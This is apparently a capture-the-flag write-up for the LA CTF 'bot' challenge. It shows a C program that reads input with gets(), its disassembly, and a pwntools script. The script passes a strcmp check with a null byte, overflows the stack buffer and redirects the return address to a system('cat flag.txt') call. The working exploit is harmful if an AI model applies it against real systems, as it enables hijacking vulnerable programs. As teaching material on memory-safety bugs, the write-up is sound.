---
title: "LA CTF - pwn: bot"
date: 2023-02-14 10:00:00 +/-0500
categories: [Cybersecurity, CTFs]
tags: [CTF, LA CTF, cybersecurity, buffer overflow, Python, strcmp, flow control]
---

## Description

I made a bot to automatically answer all of your questions.

nc lac.tf 31180

## My approach

Again, the source code, its binary, and the Dockerfile were given. Looking at the
sour code code:

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

int main(void) {
  setbuf(stdout, NULL);
  char input[64];
  volatile int give_flag = 0;
  puts("hi, how can i help?");
  gets(input);
  if (strcmp(input, "give me the flag") == 0) {
    puts("lol no");
  } else if (strcmp(input, "please give me the flag") == 0) {
    puts("no");
  } else if (strcmp(input, "help, i have no idea how to solve this") == 0) {
    puts("L");
  } else if (strcmp(input, "may i have the flag?") == 0) {
    puts("not with that attitude");
  } else if (strcmp(input, "please please please give me the flag") == 0) {
    puts("i'll consider it");
    sleep(15);
    if (give_flag) {
      puts("ok here's your flag");
      system("cat flag.txt");
    } else {
      puts("no");
    }
  } else {
    puts("sorry, i didn't understand your question");
    exit(1);
  }
}

```

After looking at the source code, I noticed that there is a `give_flag` variable
and a buffer that we can overflow since the user input is received with
`gets()`. Unlike the previous challenge I worked on, `give_flag` variable would
always be located after the buffer `input` so we won't be able to modify the
value of `give_flag` this time.

I ran checksec on the binary:

```
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x400000)

```

The NX bit is on but PIE is disabled. The immediate thought was to control the
code flow of the program by overwriting the return address. How would we do
this? I think looking at the result of `objdump` of the binary can be very
helpful.

```
0000000000401182 <main>:
  401182:       55                      push   rbp
  401183:       48 89 e5                mov    rbp,rsp
  401186:       48 83 ec 50             sub    rsp,0x50
  40118a:       48 8b 05 cf 2e 00 00    mov    rax,QWORD PTR [rip+0x2ecf]        # 404060 <stdout@GLIBC_2.2.5>
  401191:       be 00 00 00 00          mov    esi,0x0
  401196:       48 89 c7                mov    rdi,rax
  401199:       e8 a2 fe ff ff          call   401040 <setbuf@plt>
  40119e:       c7 45 bc 00 00 00 00    mov    DWORD PTR [rbp-0x44],0x0
  4011a5:       48 8d 3d 5c 0e 00 00    lea    rdi,[rip+0xe5c]        # 402008 <_IO_stdin_used+0x8>
  4011ac:       e8 7f fe ff ff          call   401030 <puts@plt>
  4011b1:       48 8d 45 c0             lea    rax,[rbp-0x40]
  4011b5:       48 89 c7                mov    rdi,rax
  4011b8:       e8 b3 fe ff ff          call   401070 <gets@plt>
  4011bd:       48 8d 45 c0             lea    rax,[rbp-0x40]
  4011c1:       48 8d 35 54 0e 00 00    lea    rsi,[rip+0xe54]        # 40201c <_IO_stdin_used+0x1c>
  4011c8:       48 89 c7                mov    rdi,rax
  4011cb:       e8 90 fe ff ff          call   401060 <strcmp@plt>
  4011d0:       85 c0                   test   eax,eax
  4011d2:       75 11                   jne    4011e5 <main+0x63>
  4011d4:       48 8d 3d 52 0e 00 00    lea    rdi,[rip+0xe52]        # 40202d <_IO_stdin_used+0x2d>
  4011db:       e8 50 fe ff ff          call   401030 <puts@plt>
  4011e0:       e9 e7 00 00 00          jmp    4012cc <main+0x14a>
  4011e5:       48 8d 45 c0             lea    rax,[rbp-0x40]
  4011e9:       48 8d 35 44 0e 00 00    lea    rsi,[rip+0xe44]        # 402034 <_IO_stdin_used+0x34>
  4011f0:       48 89 c7                mov    rdi,rax
  4011f3:       e8 68 fe ff ff          call   401060 <strcmp@plt>
  4011f8:       85 c0                   test   eax,eax
  4011fa:       75 11                   jne    40120d <main+0x8b>
  4011fc:       48 8d 3d 49 0e 00 00    lea    rdi,[rip+0xe49]        # 40204c <_IO_stdin_used+0x4c>
  401203:       e8 28 fe ff ff          call   401030 <puts@plt>
  401208:       e9 bf 00 00 00          jmp    4012cc <main+0x14a>
  40120d:       48 8d 45 c0             lea    rax,[rbp-0x40]
  401211:       48 8d 35 38 0e 00 00    lea    rsi,[rip+0xe38]        # 402050 <_IO_stdin_used+0x50>
  401218:       48 89 c7                mov    rdi,rax
  40121b:       e8 40 fe ff ff          call   401060 <strcmp@plt>
  401220:       85 c0                   test   eax,eax
  401222:       75 11                   jne    401235 <main+0xb3>
  401224:       48 8d 3d 4c 0e 00 00    lea    rdi,[rip+0xe4c]        # 402077 <_IO_stdin_used+0x77>
  40122b:       e8 00 fe ff ff          call   401030 <puts@plt>
  401230:       e9 97 00 00 00          jmp    4012cc <main+0x14a>
  401235:       48 8d 45 c0             lea    rax,[rbp-0x40]
  401239:       48 8d 35 39 0e 00 00    lea    rsi,[rip+0xe39]        # 402079 <_IO_stdin_used+0x79>
  401240:       48 89 c7                mov    rdi,rax
  401243:       e8 18 fe ff ff          call   401060 <strcmp@plt>
  401248:       85 c0                   test   eax,eax
  40124a:       75 0e                   jne    40125a <main+0xd8>
  40124c:       48 8d 3d 3b 0e 00 00    lea    rdi,[rip+0xe3b]        # 40208e <_IO_stdin_used+0x8e>
  401253:       e8 d8 fd ff ff          call   401030 <puts@plt>
  401258:       eb 72                   jmp    4012cc <main+0x14a>
  40125a:       48 8d 45 c0             lea    rax,[rbp-0x40]
  40125e:       48 8d 35 43 0e 00 00    lea    rsi,[rip+0xe43]        # 4020a8 <_IO_stdin_used+0xa8>
  401265:       48 89 c7                mov    rdi,rax
  401268:       e8 f3 fd ff ff          call   401060 <strcmp@plt>
  40126d:       85 c0                   test   eax,eax
  40126f:       75 45                   jne    4012b6 <main+0x134>
  401271:       48 8d 3d 56 0e 00 00    lea    rdi,[rip+0xe56]        # 4020ce <_IO_stdin_used+0xce>
  401278:       e8 b3 fd ff ff          call   401030 <puts@plt>
  40127d:       bf 0f 00 00 00          mov    edi,0xf
  401282:       e8 09 fe ff ff          call   401090 <sleep@plt>
  401287:       8b 45 bc                mov    eax,DWORD PTR [rbp-0x44]
  40128a:       85 c0                   test   eax,eax
  40128c:       74 1a                   je     4012a8 <main+0x126>
  40128e:       48 8d 3d 4a 0e 00 00    lea    rdi,[rip+0xe4a]        # 4020df <_IO_stdin_used+0xdf>
  401295:       e8 96 fd ff ff          call   401030 <puts@plt>
  40129a:       48 8d 3d 52 0e 00 00    lea    rdi,[rip+0xe52]        # 4020f3 <_IO_stdin_used+0xf3>
  4012a1:       e8 aa fd ff ff          call   401050 <system@plt>
  4012a6:       eb 24                   jmp    4012cc <main+0x14a>
  4012a8:       48 8d 3d 9d 0d 00 00    lea    rdi,[rip+0xd9d]        # 40204c <_IO_stdin_used+0x4c>
  4012af:       e8 7c fd ff ff          call   401030 <puts@plt>
  4012b4:       eb 16                   jmp    4012cc <main+0x14a>
  4012b6:       48 8d 3d 43 0e 00 00    lea    rdi,[rip+0xe43]        # 402100 <_IO_stdin_used+0x100>
  4012bd:       e8 6e fd ff ff          call   401030 <puts@plt>
  4012c2:       bf 01 00 00 00          mov    edi,0x1
  4012c7:       e8 b4 fd ff ff          call   401080 <exit@plt>
  4012cc:       b8 00 00 00 00          mov    eax,0x0
  4012d1:       c9                      leave
  4012d2:       c3                      ret
  4012d3:       66 2e 0f 1f 84 00 00    cs nop WORD PTR [rax+rax*1+0x0]
  4012da:       00 00 00 
  4012dd:       0f 1f 00                nop    DWORD PTR [rax]
```

This is `objdump` result of `main()`. If you compare this to the main function
written in C, you can see that all those calls to `strcmp@plt`. And what we need
to be aware is after `puts` call within the `strcmp` scope: 

```
4011cb:       e8 90 fe ff ff          call   401060 <strcmp@plt>
4011d0:       85 c0                   test   eax,eax
4011d2:       75 11                   jne    4011e5 <main+0x63>
4011d4:       48 8d 3d 52 0e 00 00    lea    rdi,[rip+0xe52]        # 40202d <_IO_stdin_used+0x2d>
4011db:       e8 50 fe ff ff          call   401030 <puts@plt>
4011e0:       e9 e7 00 00 00          jmp    4012cc <main+0x14a>
```

we can see that the code flow jumps to `4012cc` which is at the end of the main
function. If we take a look at `4012cc`:

```
4012cc:       b8 00 00 00 00          mov    eax,0x0
4012d1:       c9                      leave
4012d2:       c3                      ret
```

we can see that there is a `ret` instruction that jumps to
`__libc_start_call_main` (so the main function also returns to somewhere!). So,
if we can jump into one of the `strcmp` scope and overflow the buffer with the
address of our control, I think we can get the flag. Since PIE is disabled
meaning the program will be loaded into the exact same location every time, we
can maybe able to make the control flow go to where the `system("cat
flga.txt");` is!

But, the question is how are we going to overwrite the return address? Because
if we pass any inputs other than those ones that are being compared to some
strings, the code flow will end up hitting `exit(1)` and this terminates the
program immediately without returning to anywhere. So we want to make sure we can
jump into one of the `if` cases so the code flow ends up at `4012cc`. If you
were thinking passing a big chunk of input to the program, it will always hit
the last else part that will lead us to `exit(1)`. If we understand how `strcmp`
works, we can easily pass the input of our choice and overwrite the buffer.

`strcmp` compares two strings that are passed to it. How it works is it will
compare each character from the two strings. If it finds a match, it returns 0.
If not, then it will return some other integer values based on the result of the
integer comparison of the two characters. Let's take a look at an input `please
please please give me the
flagaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa`.

If you pass this input to the program, you will get:

```
─$ python3 -c 'print("please please please give me the flag" + "a" * 100)' | ./bot 
hi, how can i help?
sorry, i didn't understand your question
```

As you can see, it fell into the `exit(1)`. The reason is the data we passed in
did not separate between `please please ... the flag` and the `a`s that I sent
in to see if the return address gets overwritten. `strcmp` stops reading when it
sees a `NULL` byte! Using this characteristic of `strcmp`, we can build a
payload that is 

```
└─$ python3 -c 'print("please give me the flag" + "\x00" + "a" * 100)'        
please give me the flagaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
```

It may not be apparent from the string created but I inserted a null byte
between the first chunk of string and the bunch of 'a's. This will allow
`strcmp` to compare the string up to `\x00` and still the buffer will be
overwritten with a bunch of 'a's.

We will create a file that contains the payload above and pass it into GDB to
see if the payload overwrites the ret address. I modified the input file -
replaced 'a's with the cyclic of 128 chars.


```
// there is a null byte after 'flag'

please give me the flagaaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaa
```

So, I write the above payload to a file and feed it when running `bot` in GDB.
The result I got when the instruction was at `0x4012d2 <main+336>    ret`,
`0x7fffffffdd88: 0x6161616161616861`. If we find this pattern, we get 55
(meaning the distance from the beginning of the buffer to right before the ret
address is 55 bytes).

Knowing this, we can prepare a python script that will do the rest for us.

```python3
from pwn import *

p = remote("lac.tf", "31180")

payload = b"give me the flag"
payload += b"\x00"
payload += b"A" * 55

# this is the address to an instruction right before the system call
payload += p64(0x40129a)

p.sendline(payload)

p.interactive()
```

As you can see, the payload starts with "give me the flag" string followed by a
null byte so `strcmp` can actually compare the two strings. After that, I filled
55 bytes with A's and then added the address of the instruction that I want the
code flow to go to. If we run this script, we would get:

```
└─$ python3 sol.py
[+] Opening connection to lac.tf on port 31180: Done
[*] Switching to interactive mode
hi, how can i help?
lol no
lactf{hey_stop_bullying_my_bot_thats_not_nice}
```

## Conclusion

Noticing how `strcmp` works and creating a payload that exploits that
characteristic was important. Thanks for reading!



